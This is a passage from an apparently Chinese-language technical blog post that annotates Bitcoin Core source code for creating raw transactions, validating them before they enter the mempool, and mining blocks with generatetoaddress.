class="number">0</span>&#125;, <span class="string">&quot;Raw locktime. Non-0 value also locktime-activates inputs&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;replaceable&quot;</span>, RPCArg::Type::BOOL, RPCArg::Default&#123;<span class="literal">false</span>&#125;, <span class="string">&quot;Marks this transaction as BIP125-replaceable.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;                             Allows this transaction to be replaced by a transaction with higher fees. If provided, it is an error if explicit sequence numbers are incompatible.&quot;</span>&#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">                RPCResult&#123;</span><br><span class="line">                    RPCResult::Type::STR_HEX, <span class="string">&quot;transaction&quot;</span>, <span class="string">&quot;hex string of the transaction&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                RPCExamples&#123;</span><br><span class="line">                    <span class="built_in">HelpExampleCli</span>(<span class="string">&quot;createrawtransaction&quot;</span>, <span class="string">&quot;\&quot;[&#123;\\\&quot;txid\\\&quot;:\\\&quot;myid\\\&quot;,\\\&quot;vout\\\&quot;:0&#125;]\&quot; \&quot;[&#123;\\\&quot;address\\\&quot;:0.01&#125;]\&quot;&quot;</span>)</span><br><span class="line">            + <span class="built_in">HelpExampleCli</span>(<span class="string">&quot;createrawtransaction&quot;</span>, <span class="string">&quot;\&quot;[&#123;\\\&quot;txid\\\&quot;:\\\&quot;myid\\\&quot;,\\\&quot;vout\\\&quot;:0&#125;]\&quot; \&quot;[&#123;\\\&quot;data\\\&quot;:\\\&quot;00010203\\\&quot;&#125;]\&quot;&quot;</span>)</span><br><span class="line">            + <span class="built_in">HelpExampleRpc</span>(<span class="string">&quot;createrawtransaction&quot;</span>, <span class="string">&quot;\&quot;[&#123;\\\&quot;txid\\\&quot;:\\\&quot;myid\\\&quot;,\\\&quot;vout\\\&quot;:0&#125;]\&quot;, \&quot;[&#123;\\\&quot;address\\\&quot;:0.01&#125;]\&quot;&quot;</span>)</span><br><span class="line">            + <span class="built_in">HelpExampleRpc</span>(<span class="string">&quot;createrawtransaction&quot;</span>, <span class="string">&quot;\&quot;[&#123;\\\&quot;txid\\\&quot;:\\\&quot;myid\\\&quot;,\\\&quot;vout\\\&quot;:0&#125;]\&quot;, \&quot;[&#123;\\\&quot;data\\\&quot;:\\\&quot;00010203\\\&quot;&#125;]\&quot;&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">        [&amp;](<span class="type">const</span> RPCHelpMan&amp; self, <span class="type">const</span> JSONRPCRequest&amp; request) -&gt; UniValue</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 检查四个参数 inputs outputs locktime replaceable 类型是否正确</span></span><br><span class="line">    <span class="built_in">RPCTypeCheck</span>(request.params, &#123;</span><br><span class="line">        UniValue::VARR,</span><br><span class="line">        <span class="built_in">UniValueType</span>(), <span class="comment">// ARR or OBJ, checked later</span></span><br><span class="line">        UniValue::VNUM,</span><br><span class="line">        UniValue::VBOOL</span><br><span class="line">        &#125;, <span class="literal">true</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> rbf = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!request.params[<span class="number">3</span>].<span class="built_in">isNull</span>()) &#123;</span><br><span class="line">        rbf = request.params[<span class="number">3</span>].<span class="built_in">isTrue</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造交易（包括交易的输入vin、输出vout及锁定脚本），返回序列化数据</span></span><br><span class="line">    CMutableTransaction rawTx = <span class="built_in">ConstructTransaction</span>(request.params[<span class="number">0</span>], request.params[<span class="number">1</span>], request.params[<span class="number">2</span>], rbf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 哈希</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">EncodeHexTx</span>(<span class="built_in">CTransaction</span>(rawTx));</span><br><span class="line">&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数定义了命令的说明、请求参数、返回值与内部实现过程，主要是根据请求参数构造一笔交易，然后返回交易的哈希值。构造的过程主要包括构造交易的输入vin、输出vout及<strong>锁定脚本</strong> ，具体内容不在此讲解。</p>
<p>构建交易之后，需要使用<code>$ bitcoin-cli signrawtransactionwithkey</code>对交易进行签名，其处理函数也在<code>src\rpc\rawtransaction.cpp</code>中，主要内容是构建vin中的<strong>解锁脚本</strong> 。</p>
<p>签名后，就可以使用<code>$ bitcoin-cli sendrawtransaction</code>将交易广播至比特币网络中，具体实现代码不在此展示。</p>
<h2 id="验证交易"><a href="#验证交易" class="headerlink" title="验证交易"></a>验证交易</h2><p>Bitcoin Core客户端可通过<code>bitcoind</code>命令启动，启动的入口函数是<code>src\bitcoind.cpp</code>中的<code>main</code>函数。启动之后，Bitcoin Core会启动一个线程用于监听、接收并响应比特币网络中的信息，该线程对应的函数<code>CConnman::ThreadMessageHandler</code>在<code>src\net.cpp</code>中。</p>
<p>该函数会调用<code>src\net_processing.cpp</code>中的<code>PeerManagerImpl::ProcessMessages</code>函数处理接收到的信息，而它会进一步调用同在<code>src\net_processing.cpp</code>中的<code>PeerManagerImpl::ProcessMessage</code>函数。其被调用的关系如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">main -&gt; AppInit -&gt; AppInitMain -&gt; CConnman::Start -&gt; CConnman::ThreadMessageHandler</span><br><span class="line">-&gt; PeerManagerImpl::ProcessMessages -&gt; PeerManagerImpl::ProcessMessage</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在<code>PeerManagerImpl::ProcessMessage</code>函数中，会根据信息类型进行不同的处理，如果是交易类型的消息，则会调用<code>src\validation.cpp</code>中的<code>AcceptToMemoryPool</code>函数将交易存放到交易池中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PeerManagerImpl::ProcessMessage</span><span class="params">(CNode&amp; pfrom, <span class="type">const</span> std::string&amp; msg_type, CDataStream&amp; vRecv,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="type">const</span> std::chrono::microseconds time_received,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="type">const</span> std::atomic&lt;<span class="type">bool</span>&gt;&amp; interruptMsgProc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果消息是交易类型</span></span><br><span class="line">    <span class="keyword">if</span> (msg_type == NetMsgType::TX) &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接收到交易池中</span></span><br><span class="line">        <span class="type">const</span> MempoolAcceptResult result = <span class="built_in">AcceptToMemoryPool</span>(m_chainman.<span class="built_in">ActiveChainstate</span>(), m_mempool, ptx, <span class="literal">false</span> <span class="comment">/* bypass_limits */</span>);</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>AcceptToMemoryPool</code>函数进而调用<code>AcceptToMemoryPoolWithTime</code>函数，接着调用<code>MemPoolAccept:: AcceptSingleTransaction</code>函数。</p>
<p>而这个<code>MemPoolAccept::AcceptSingleTransaction</code>函数，是接收交易的入口函数。在这个函数中，又会调用<code>MemPoolAccept::PreChecks</code>函数，它是关键中的关键，负责对交易进行全方位的检查。在这个函数中：</p>
<ol>
<li>首先，会调用<code>src\consensus\tx_check.cpp</code>中的<code>CheckTransaction</code>函数，进行基础的检查：</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckTransaction</span><span class="params">(<span class="type">const</span> CTransaction&amp; tx, TxValidationState&amp; state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1. 检查交易的输入输出是否为空</span></span><br><span class="line">    <span class="comment">// Basic checks that don&#x27;t depend on any context</span></span><br><span class="line">    <span class="keyword">if</span> (tx.vin.<span class="built_in">empty</span>())</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-vin-empty&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (tx.vout.<span class="built_in">empty</span>())</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-vout-empty&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查交易大小不能超过MAX_BLOCK_WEIGHT</span></span><br><span class="line">    <span class="comment">// Size limits (this doesn&#x27;t take the witness into account, as that hasn&#x27;t been checked for malleability)</span></span><br><span class="line">    <span class="keyword">if</span> (::<span class="built_in">GetSerializeSize</span>(tx, PROTOCOL_VERSION | SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT)</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-oversize&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 检查输出值不能为负数或者超过范围</span></span><br><span class="line">    <span class="comment">// Check for negative or overflow output values (see CVE-2010-5139)</span></span><br><span class="line">    CAmount nValueOut = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; txout : tx.vout) &#123;</span><br><span class="line">        <span class="keyword">if</span> (txout.nValue &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-vout-negative&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (txout.nValue &gt; MAX_MONEY)</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-vout-toolarge&quot;</span>);</span><br><span class="line">        nValueOut += txout.nValue;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">MoneyRange</span>(nValueOut))</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-txouttotal-toolarge&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 检查是否有重复的输入</span></span><br><span class="line">    <span class="comment">// Check for duplicate inputs (see CVE-2018-17144)</span></span><br><span class="line">    <span class="comment">// While Consensus::CheckTxInputs does check if all inputs of a tx are available, and UpdateCoins marks all inputs</span></span><br><span class="line">    <span class="comment">// of a tx as spent, it does not check if the tx has duplicate inputs.</span></span><br><span class="line">    <span class="comment">// Failure to run this check will result in either a crash or an inflation bug, depending on the implementation of</span></span><br><span class="line">    <span class="comment">// the underlying coins database.</span></span><br><span class="line">    std::set&lt;COutPoint&gt; vInOutPoints;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; txin : tx.vin) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!vInOutPoints.<span class="built_in">insert</span>(txin.prevout).second)</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-inputs-duplicate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tx.<span class="built_in">IsCoinBase</span>()) &#123;</span><br><span class="line">        <span class="comment">// 5.1. 如果是铸币交易，检查输入中解锁脚本的大小</span></span><br><span class="line">        <span class="keyword">if</span> (tx.vin[<span class="number">0</span>].scriptSig.<span class="built_in">size</span>() &lt; <span class="number">2</span> || tx.vin[<span class="number">0</span>].scriptSig.<span class="built_in">size</span>() &gt; <span class="number">100</span>)</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-cb-length&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 5.2. 若不是铸币交易，检查输入对应的来源不能为空</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; txin : tx.vin)</span><br><span class="line">            <span class="keyword">if</span> (txin.prevout.<span class="built_in">IsNull</span>())</span><br><span class="line">                <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-prevout-null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>这笔被接受的交易不能是铸币交易：</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Coinbase is only valid in a block, not as a loose transaction</span></span><br><span class="line"><span class="keyword">if</span> (tx.<span class="built_in">IsCoinBase</span>())</span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;coinbase&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>检查是否为标准交易，调用<code>src\policy\policy.cpp</code>中的<code>IsStandardTx</code>函数，检查交易的版本、大小、脚本、输出中UTXO个数等是否符合标准。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::string reason;</span><br><span class="line"><span class="keyword">if</span> (fRequireStandard &amp;&amp; !<span class="built_in">IsStandardTx</span>(tx, reason))</span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_NOT_STANDARD, reason);</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>交易的字节大小不能太小。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (::<span class="built_in">GetSerializeSize</span>(tx, PROTOCOL_VERSION | SERIALIZE_TRANSACTION_NO_WITNESS) &lt; MIN_STANDARD_TX_NONWITNESS_SIZE)</span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_NOT_STANDARD, <span class="string">&quot;tx-size-small&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>只接受<code>nLockTime</code>满足要求、能够被打包进下一个被挖区块中的交易，防止交易过多溢出交易池。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Only accept nLockTime-using transactions that can be mined in the next</span></span><br><span class="line"><span class="comment">// block; we don&#x27;t want our mempool filled up with transactions that can&#x27;t</span></span><br><span class="line"><span class="comment">// be mined yet.</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CheckFinalTx</span>(m_active_chainstate.m_chain.<span class="built_in">Tip</span>(), tx, STANDARD_LOCKTIME_VERIFY_FLAGS))</span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_PREMATURE_SPEND, <span class="string">&quot;non-final&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>检查这笔交易是否已存在交易池中，或有相同未认证的数据已在交易池中。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (m_pool.<span class="built_in">exists</span>(<span class="built_in">GenTxid</span>(<span class="literal">true</span>, tx.<span class="built_in">GetWitnessHash</span>()))) &#123;</span><br><span class="line">    <span class="comment">// Exact transaction already exists in the mempool.</span></span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONFLICT, <span class="string">&quot;txn-already-in-mempool&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (m_pool.<span class="built_in">exists</span>(<span class="built_in">GenTxid</span>(<span class="literal">false</span>, tx.<span class="built_in">GetHash</span>()))) &#123;</span><br><span class="line">    <span class="comment">// Transaction with the same non-witness data but different witness (same txid, different</span></span><br><span class="line">    <span class="comment">// wtxid) already exists in the mempool.</span></span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONFLICT, <span class="string">&quot;txn-same-nonwitness-data-in-mempool&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>检查交易输入所指向的上一笔交易输出<code>prevout</code>是否与交易池中某笔交易的一样，即防止双花。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check for conflicts with in-memory transactions</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> CTxIn &amp;txin : tx.vin)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> CTransaction* ptxConflicting = m_pool.<span class="built_in">GetConflictTx</span>(txin.prevout);</span><br><span class="line">    <span class="keyword">if</span> (ptxConflicting) &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>检查交易所有输入的来源(UTXO)是否已在缓存中，若不在则获取。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> CCoinsViewCache&amp; coins_cache = m_active_chainstate.<span class="built_in">CoinsTip</span>();</span><br><span class="line"><span class="comment">// do all inputs exist?</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> CTxIn&amp; txin : tx.vin) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!coins_cache.<span class="built_in">HaveCoinInCache</span>(txin.prevout)) &#123;</span><br><span class="line">        coins_to_uncache.<span class="built_in">push_back</span>(txin.prevout);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note: this call may add txin.prevout to the coins cache</span></span><br><span class="line">    <span class="comment">// (coins_cache.cacheCoins) by way of FetchCoin(). It should be removed</span></span><br><span class="line">    <span class="comment">// later (via coins_to_uncache) if this tx turns out to be invalid.</span></span><br><span class="line">    <span class="keyword">if</span> (!m_view.<span class="built_in">HaveCoin</span>(txin.prevout)) &#123;</span><br><span class="line">       ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>检查时间锁<code>sequence</code>是否满足要求，即可以被打包进下一个待挖区块中，不然就丢弃。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Only accept BIP68 sequence locked transactions that can be mined in the next</span></span><br><span class="line"><span class="comment">// block; we don&#x27;t want our mempool filled up with transactions that can&#x27;t</span></span><br><span class="line"><span class="comment">// be mined yet.</span></span><br><span class="line"><span class="comment">// Pass in m_view which has all of the relevant inputs cached. Note that, since m_view&#x27;s</span></span><br><span class="line"><span class="comment">// backend was removed, it no longer pulls coins from the mempool.</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CheckSequenceLocks</span>(m_active_chainstate.m_chain.<span class="built_in">Tip</span>(), m_view, tx, STANDARD_LOCKTIME_VERIFY_FLAGS, &amp;lp))</span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_PREMATURE_SPEND, <span class="string">&quot;non-BIP68-final&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>调用<code>src\consensus\tx_verify.cpp</code>中的<code>Consensus::CheckTxInputs</code>函数检查交易的输入。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Consensus::CheckTxInputs</span><span class="params">(<span class="type">const</span> CTransaction&amp; tx, TxValidationState&amp; state, <span class="type">const</span> CCoinsViewCache&amp; inputs, <span class="type">int</span> nSpendHeight, CAmount&amp; txfee)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1. 检查输入的来源(UTXO)是否都在缓存中</span></span><br><span class="line">    <span class="comment">// are the actual inputs available?</span></span><br><span class="line">    <span class="keyword">if</span> (!inputs.<span class="built_in">HaveInputs</span>(tx)) &#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_MISSING_INPUTS, <span class="string">&quot;bad-txns-inputs-missingorspent&quot;</span>,</span><br><span class="line">                         <span class="built_in">strprintf</span>(<span class="string">&quot;%s: inputs missing/spent&quot;</span>, __func__));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CAmount nValueIn = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; tx.vin.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="type">const</span> COutPoint &amp;prevout = tx.vin[i].prevout;</span><br><span class="line">        <span class="type">const</span> Coin&amp; coin = inputs.<span class="built_in">AccessCoin</span>(prevout);</span><br><span class="line">        <span class="comment">// 2. 输入来源不能被双花</span></span><br><span class="line">        <span class="built_in">assert</span>(!coin.<span class="built_in">IsSpent</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 如果来源是coinbase，检查是否成熟（确认数不小于100）</span></span><br><span class="line">        <span class="comment">// If prev is coinbase, check that it&#x27;s matured</span></span><br><span class="line">        <span class="keyword">if</span> (coin.<span class="built_in">IsCoinBase</span>() &amp;&amp; nSpendHeight - coin.nHeight &lt; COINBASE_MATURITY) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_PREMATURE_SPEND, <span class="string">&quot;bad-txns-premature-spend-of-coinbase&quot;</span>,</span><br><span class="line">                <span class="built_in">strprintf</span>(<span class="string">&quot;tried to spend coinbase at depth %d&quot;</span>, nSpendHeight - coin.nHeight));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 检查每一个输入值和总值是否在限定范围内</span></span><br><span class="line">        <span class="comment">// Check for negative or overflow input values</span></span><br><span class="line">        nValueIn += coin.out.nValue;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">MoneyRange</span>(coin.out.nValue) || !<span class="built_in">MoneyRange</span>(nValueIn)) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-inputvalues-outofrange&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 交易输出总值不能大于输入总值</span></span><br><span class="line">    <span class="type">const</span> CAmount value_out = tx.<span class="built_in">GetValueOut</span>();</span><br><span class="line">    <span class="keyword">if</span> (nValueIn &lt; value_out) &#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-in-belowout&quot;</span>,</span><br><span class="line">            <span class="built_in">strprintf</span>(<span class="string">&quot;value in (%s) &lt; value out (%s)&quot;</span>, <span class="built_in">FormatMoney</span>(nValueIn), <span class="built_in">FormatMoney</span>(value_out)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 交易的矿工费用需在规定范围内</span></span><br><span class="line">    <span class="comment">// Tally transaction fees</span></span><br><span class="line">    <span class="type">const</span> CAmount txfee_aux = nValueIn - value_out;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">MoneyRange</span>(txfee_aux)) &#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_CONSENSUS, <span class="string">&quot;bad-txns-fee-outofrange&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    txfee = txfee_aux;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="11">
<li>检查输入和输入的见证脚本是否符合标准（解锁脚本能否解开prevout的锁定脚本）。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check for non-standard pay-to-script-hash in inputs</span></span><br><span class="line"><span class="type">const</span> <span class="type">bool</span> taproot_active = <span class="built_in">DeploymentActiveAfter</span>(m_active_chainstate.m_chain.<span class="built_in">Tip</span>(), args.m_chainparams.<span class="built_in">GetConsensus</span>(), Consensus::DEPLOYMENT_TAPROOT);</span><br><span class="line"><span class="keyword">if</span> (fRequireStandard &amp;&amp; !<span class="built_in">AreInputsStandard</span>(tx, m_view, taproot_active)) &#123;</span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_INPUTS_NOT_STANDARD, <span class="string">&quot;bad-txns-nonstandard-inputs&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for non-standard witnesses.</span></span><br><span class="line"><span class="keyword">if</span> (tx.<span class="built_in">HasWitness</span>() &amp;&amp; fRequireStandard &amp;&amp; !<span class="built_in">IsWitnessStandard</span>(tx, m_view))</span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_WITNESS_MUTATED, <span class="string">&quot;bad-witness-nonstandard&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="12">
<li>交易中的签名数量(sigops)应小于签名操作数量上限。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nSigOpsCost &gt; MAX_STANDARD_TX_SIGOPS_COST)</span><br><span class="line">    <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(TxValidationResult::TX_NOT_STANDARD, <span class="string">&quot;bad-txns-too-many-sigops&quot;</span>,</span><br><span class="line">            <span class="built_in">strprintf</span>(<span class="string">&quot;%d&quot;</span>, nSigOpsCost));</span><br></pre></td></tr></table></figure>

<h2 id="创建区块"><a href="#创建区块" class="headerlink" title="创建区块"></a>创建区块</h2><p>在Bitcoin Core中，可通过<code>$ bitcoin-cli generatetoaddress</code>命令进行挖矿，命令内部实现定义在<code>src\rpc\mining.cpp</code>的<code>generatetoaddress</code>函数中：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> RPCHelpMan <span class="title">generatetoaddress</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> RPCHelpMan&#123;<span class="string">&quot;generatetoaddress&quot;</span>,</span><br><span class="line">                <span class="string">&quot;\nMine blocks immediately to a specified address (before the RPC call returns)\n&quot;</span>,</span><br><span class="line">                &#123;</span><br><span class="line">                    &#123;<span class="string">&quot;nblocks&quot;</span>, RPCArg::Type::NUM, RPCArg::Optional::NO, <span class="string">&quot;How many blocks are generated immediately.&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;address&quot;</span>, RPCArg::Type::STR, RPCArg::Optional::NO, <span class="string">&quot;The address to send the newly generated bitcoin to.&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;maxtries&quot;</span>, RPCArg::Type::NUM, RPCArg::Default&#123;DEFAULT_MAX_TRIES&#125;, <span class="string">&quot;How many iterations to try.&quot;</span>&#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">                RPCResult&#123;</span><br><span class="line">                    RPCResult::Type::ARR, <span class="string">&quot;&quot;</span>, <span class="string">&quot;hashes of blocks generated&quot;</span>,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &#123;RPCResult::Type::STR_HEX, <span class="string">&quot;&quot;</span>, <span class="string">&quot;blockhash&quot;</span>&#125;,</span><br><span class="line">                    &#125;&#125;,</span><br><span class="line">                RPCExamples&#123;</span><br><span class="line">            <span class="string">&quot;\nGenerate 11 blocks to myaddress\n&quot;</span></span><br><span class="line">            + <span class="built_in">HelpExampleCli</span>(<span class="string">&quot;generatetoaddress&quot;</span>, <span class="string">&quot;11 \&quot;myaddress\&quot;&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;If you are using the &quot;</span> PACKAGE_NAME <span class="string">&quot; wallet, you can get a new address to send the newly generated bitcoin to with:\n&quot;</span></span><br><span class="line">            + <span class="built_in">HelpExampleCli</span>(<span class="string">&quot;getnewaddress&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">        [&amp;](<span class="type">const</span> RPCHelpMan&amp; self, <span class="type">const</span> JSONRPCRequest&amp; request) -&gt; UniValue</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 要创建区块的个数</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> num_blocks&#123;request.params[<span class="number">0</span>].<span class="built_in">get_int</span>()&#125;;</span><br><span class="line">    <span class="comment">// 尝试次数</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> max_tries&#123;request.params[<span class="number">2</span>].<span class="built_in">isNull</span>() ? DEFAULT_MAX_TRIES : request.params[<span class="number">2</span>].<span class="built_in">get_int</span>()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建区块所获得的coinbase奖励转入的地址</span></span><br><span class="line">    CTxDestination destination = <span class="built_in">DecodeDestination</span>(request.params[<span class="number">1</span>].<span class="built_in">get_str</span>());</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">IsValidDestination</span>(destination)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">JSONRPCError</span>(RPC_INVALID_ADDRESS_OR_KEY, <span 